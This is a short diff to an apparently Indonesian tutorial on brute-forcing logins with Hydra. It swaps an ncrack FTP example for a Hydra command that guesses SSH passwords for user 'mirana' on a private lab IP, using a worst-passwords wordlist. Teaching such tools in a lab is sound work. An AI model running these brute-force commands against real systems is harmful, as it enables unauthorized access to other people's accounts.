@@ -50,7 +50,7 @@ Perintah yang digunakan untuk menjalankan Hydra adalah:
 hydra -l [username] -v -t 7 -P [pass_dictionary] [host_target] ssh
 ```
 ```
-# ncrack -u victim -P 500-worst-passwords.txt 10.151.36.120 -p 21
+# hydra -l mirana -v -t 7 -P 500-worst-passwords.txt 10.151.36.120 ssh
 ```
 
 >-l&nbsp;&nbsp;&nbsp;&nbsp;Option untuk memasukkan username
